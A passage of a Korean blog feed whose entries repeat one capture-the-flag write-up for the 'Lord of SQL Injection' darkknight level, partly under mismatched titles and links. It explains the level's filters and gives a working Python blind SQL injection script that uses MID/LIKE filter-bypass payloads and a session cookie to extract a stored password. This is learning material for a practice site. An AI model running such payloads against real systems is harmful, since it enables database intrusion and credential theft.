class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">    data = <span class="string">"-1 || length(pw) LIKE &#123;&#125;#"</span>.format(str(i)) <span class="comment"># = 을 못쓰므로 LIKE 로 수정</span></span><br><span class="line">    print(data)</span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        pwlen = i</span><br><span class="line">        print(<span class="string">'pw length : '</span> + str(pwlen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (chr(j) == <span class="string">'%'</span> <span class="keyword">or</span> chr(j) == <span class="string">'_'</span>): <span class="comment"># LIKE 를 사용하므로 와일드카드인 %와 _는 제외</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">        data = <span class="string">'-1 || MID(pw, 1, &#123;&#125;) LIKE "&#123;&#125;"#'</span>.format( <span class="comment"># or, and 를 ||, &amp;&amp; 로 수정, MID 함수 사용, = 을 LIKE 로 수정, ' 를 "로 수정</span></span><br><span class="line">            str(i), key + chr(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j).lower()</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>1c62ba6f</code> 를 출력한다.<br>이를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=1c62ba6f</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.12 Darkknight</title>
    <link href="https://www.jslee.me/2019/08/23/los-write-up-14-giant/"/>
    <id>https://www.jslee.me/2019/08/23/los-write-up-14-giant/</id>
    <published>2019-08-23T01:28:26.000Z</published>
    <updated>2019-09-09T05:38:15.607Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code>을 대소문자 구분 없이 포함하지 않고 Blind SQL Injection을 하여 <code>pw</code>를 알아낼 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>darkknight 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>pw</code>에 <code>&#39;</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>no</code>에 <code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code> 이 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>와 <code>no</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>MID</code> 함수, <code>LIKE</code> 활용</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">pwlen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">    data = <span class="string">"-1 || length(pw) LIKE &#123;&#125;#"</span>.format(str(i)) <span class="comment"># = 을 못쓰므로 LIKE 로 수정</span></span><br><span class="line">    print(data)</span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        pwlen = i</span><br><span class="line">        print(<span class="string">'pw length : '</span> + str(pwlen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (chr(j) == <span class="string">'%'</span> <span class="keyword">or</span> chr(j) == <span class="string">'_'</span>): <span class="comment"># LIKE 를 사용하므로 와일드카드인 %와 _는 제외</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">        data = <span class="string">'-1 || MID(pw, 1, &#123;&#125;) LIKE "&#123;&#125;"#'</span>.format( <span class="comment"># or, and 를 ||, &amp;&amp; 로 수정, MID 함수 사용, = 을 LIKE 로 수정, ' 를 "로 수정</span></span><br><span class="line">            str(i), key + chr(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j).lower()</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>1c62ba6f</code> 를 출력한다.<br>이를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=1c62ba6f</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.12 Darkknight</title>
    <link href="https://www.jslee.me/2019/08/23/los-write-up-13-bugbear/"/>
    <id>https://www.jslee.me/2019/08/23/los-write-up-13-bugbear/</id>
    <published>2019-08-23T01:28:26.000Z</published>
    <updated>2019-09-09T05:38:15.606Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code>을 대소문자 구분 없이 포함하지 않고 Blind SQL Injection을 하여 <code>pw</code>를 알아낼 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>darkknight 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>pw</code>에 <code>&#39;</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>no</code>에 <code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code> 이 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>와 <code>no</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>MID</code> 함수, <code>LIKE</code> 활용</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">pwlen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">    data = <span class="string">"-1 || length(pw) LIKE &#123;&#125;#"</span>.format(str(i)) <span class="comment"># = 을 못쓰므로 LIKE 로 수정</span></span><br><span class="line">    print(data)</span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        pwlen = i</span><br><span class="line">        print(<span class="string">'pw length : '</span> + str(pwlen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (chr(j) == <span class="string">'%'</span> <span class="keyword">or</span> chr(j) == <span class="string">'_'</span>): <span class="comment"># LIKE 를 사용하므로 와일드카드인 %와 _는 제외</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">        data = <span class="string">'-1 || MID(pw, 1, &#123;&#125;) LIKE "&#123;&#125;"#'</span>.format( <span class="comment"># or, and 를 ||, &amp;&amp; 로 수정, MID 함수 사용, = 을 LIKE 로 수정, ' 를 "로 수정</span></span><br><span class="line">            str(i), key + chr(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        